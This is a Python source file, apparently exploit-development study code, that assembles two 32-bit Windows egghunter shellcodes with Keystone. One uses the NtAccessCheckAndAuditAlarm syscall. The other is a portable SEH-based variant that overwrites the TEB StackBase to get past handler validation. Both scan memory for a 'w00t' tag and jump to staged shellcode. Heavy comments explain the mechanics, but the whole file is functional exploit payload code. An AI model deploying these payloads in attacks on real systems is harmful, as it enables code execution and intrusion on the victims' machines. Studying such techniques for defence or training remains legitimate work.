from keystone import *


def GetEgghuntingOpcode(returnString: bool):
    """Hardcoded syscall for `NtAccessCheckAndAuditAlarm` API (neg 0x1c6)

    Args:
        returnString (bool): Whether to return the opcode in `bytes` or string-bytes (`'\\x##'`)
    """
    CODE = (
        # we use the edx register as a memory page counter
        """
    init:
        xor edx,edx;        // i noticed my edx has a high address when it starts
        
    loop_inc_page:
        or dx, 0xfff;       // Go to the last address in the memory page

    loop_inc_one:
        inc edx;            // increase the mem counter by 1
"""

        # the syscall number may not always be the same!
        # syscall number == 0x2 == NtAccessCheckAndAuditAlarm before Windows 8
        # To determine what is the current syscall number, we need to disassemble
        # the function NtAccessCheckAndAuditAlarm!
        # When we performed `u ntdll!NtAccessCheckAndAuditAlarm`, we see that we need
        # EAX == 0x1c6 in order to perform the syscall.
        """
    loop_check:
        push edx;           // save the edx reg, which holds our mem addr, on the stack
        push 0xfffffe3a;    // sys call number
        pop eax;            // init call to NtAccessCheckAndAuditAlarm
        neg eax;            // get back 0x1c6
        int 0x2e;           // syscall
        cmp al,0x5;         // check for access violation: 0xc0000005 (ACCESS_VIOLATION)
        pop edx;            // restore the edx register to check later for our egg

    loop_check_valid:
        je loop_inc_page;

    is_egg:
        mov eax, 0x74303077;// ('w00t' egg) Load egg into eax
        mov edi, edx;
        scasd;              // eax == *edi ? edi += 4 (DWORD) : jnz loop_inc_one
        jnz loop_inc_one;   // eax !== edx
        scasd;              // eax == *edi ? edi += 4 (DWORD) : jnz loop_inc_one
        jnz loop_inc_one;   // eax !== edx

    matched:
        jmp edi;            // jumps to shellcode in Heap, once egg is found!
    """
    )
    # print(CODE)

    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(CODE)
    if returnString:
        return "".join([f"\\x{ins:02x}" for ins in encoding])
    else:
        return bytearray(encoding)


def GetPortableEgghuntingOpcode(returnString: bool):
    """Creates SEH Handling function instead of relying on syscalls.

    Downside is this egghunter is 60 bytes, whereas the previous one is 35 bytes

    Args:
        returnString (bool): Whether to return the opcode in `bytes` or string-bytes (`'\\x##'`)
    """
    CODE = (
        """
        start:  
            jmp get_seh_address;                // jump to a negative call to dynamically obtain egghunter position
        
        build_exception_record:
            pop ecx;                            // ret address of caller in `get_seh_address`
            mov eax, 0x74303077;                // eax == "w00t";
            push ecx;
            push 0xffffffff;
            xor ebx, ebx;
            mov dword ptr fs:[ebx], esp;        // overwrite SEH record with [Next=0xffffffff, Handler=get_seh_address+0x2]
        """
        # ! we add the following instructions to change our StackBase of our TEB so that our
        # ! Except_Handler can pass the RtlIsValidHandler checks, which states that our &_handler
        # ! must NOT reside in the Stack
        """
            sub ecx, 0x04;                      // newStackBase = &handler - 4
            add ebx,0x04;
            mov dword ptr fs:[ebx], ecx         // Overwrite the StackBase in the TEB with our handler address (so &_handler == &StackBase)
                                                // StackBase = newStackBase; &handler > StackBase == not executing inside Stack
        """
        """
            /******************
            _PEXCEPTION_REGISTRATION_RECORD* ExceptionList	FS:[0x00]
            DWORD StackBase	                                FS:[0x04]
            DWORD StackLimit	                            FS:[0x08]
            DWORD SubSystemTib	                            FS:[0x0C]
            DWORD FiberData	                                FS:[0x10]
            DWORD ArbitraryUserPointer	                    FS:[0x14]
            DWORD TIBOffset	                                FS:[0x18]
            *******************/
        """
        """
        is_egg:
            push 0x02;                          // counter == 2
            pop ecx;
            mov edi, ebx;                       // ebx holds memory address potentially containing 'w00t' egg
            repe scasd;                         // scan string dword until !ecx, only if eax==edi
            jnz loop_inc_one;
            jmp edi;

        loop_inc_page:
            or bx,0xfff;

        loop_inc_one:
            inc ebx;
            jmp is_egg;

        get_seh_address:
            call build_exception_record;        // call to a higher address to avoid null bytes
            push 0x0c;
            pop ecx;
            mov eax, [esp+ecx];                 // eax = (PCONTEXT*) (&EXCEPTION_DISPOSITION + 0xc) --> this is ContextRecord
                                                // REMINDER that when we hit the exception handle function, we are in `_except_handler`
                                                // this meant that the arguments to this function will be in the stack `esp`
                                                // and we can gain reference to these arguments directly, hence `mov eax, [esp+ecx]`.
                                                // Very importantly, we need to know how SEH is handled by the OS.
                                                // When we return from this function, there must be a certain value that it receives so
                                                // that the OS knows how to proceed from there. 

        """
        """/*****************
            typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
                IN PEXCEPTION_RECORD ExceptionRecord,  
                IN VOID EstablisherFrame,
                IN OUT PCONTEXT ContextRecord, 
                IN OUT PDISPATCHER_CONTEXT DispatcherContext  
            ); 

            >>>>>>ENUM FLAGS FOR RETURN FROM _except_handler()

            0:006> dt _EXCEPTION_DISPOSITION
            ntdll!_EXCEPTION_DISPOSITION
            ExceptionContinueExecution = 0n0
            ExceptionContinueSearch = 0n1
            ExceptionNestedException = 0n2
            ExceptionCollidedUnwind = 0n3

            *****************/
            
            /*****************
            ntdll!_CONTEXT
                +0x000 ContextFlags     : Uint4B
                +0x004 Dr0              : Uint4B
                +0x008 Dr1              : Uint4B
                +0x00c Dr2              : Uint4B
                +0x010 Dr3              : Uint4B
                +0x014 Dr6              : Uint4B
                +0x018 Dr7              : Uint4B
                +0x01c FloatSave        : _FLOATING_SAVE_AREA
                +0x08c SegGs            : Uint4B
                +0x090 SegFs            : Uint4B
                +0x094 SegEs            : Uint4B
                +0x098 SegDs            : Uint4B
                +0x09c Edi              : Uint4B
                +0x0a0 Esi              : Uint4B
                +0x0a4 Ebx              : Uint4B
                +0x0a8 Edx              : Uint4B
                +0x0ac Ecx              : Uint4B
                +0x0b0 Eax              : Uint4B
                +0x0b4 Ebp              : Uint4B
                +0x0b8 Eip              : Uint4B
                +0x0bc SegCs            : Uint4B
                +0x0c0 EFlags           : Uint4B
                +0x0c4 Esp              : Uint4B
                +0x0c8 SegSs            : Uint4B
                +0x0cc ExtendedRegisters : [512] UChar
            *******************/
        """
        """
            mov cl, 0xb8;
            add dword ptr ds:[eax+ecx], 0x06;   // eax+0xb8 + 6 == _CONTEXT.Eip + 6 --> points at or bx,0xfff
                                                // take note that stack grows negatively
            
            pop eax;                            // save return address from _except_handler()
            add esp, 0x10;                      // clean stack (4 arguments)
            push eax;                           // restore return address
            xor eax, eax;                       // ExceptionContinueExecution == 0
            ret;                                // return from _except_handler()


        """
    )
    # print(CODE)

    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(CODE)
    if returnString:
        return "".join([f"\\x{ins:02x}" for ins in encoding])
    else:
        return bytearray(encoding)


if __name__ == "__main__":
    print(GetPortableEgghuntingOpcode(True))
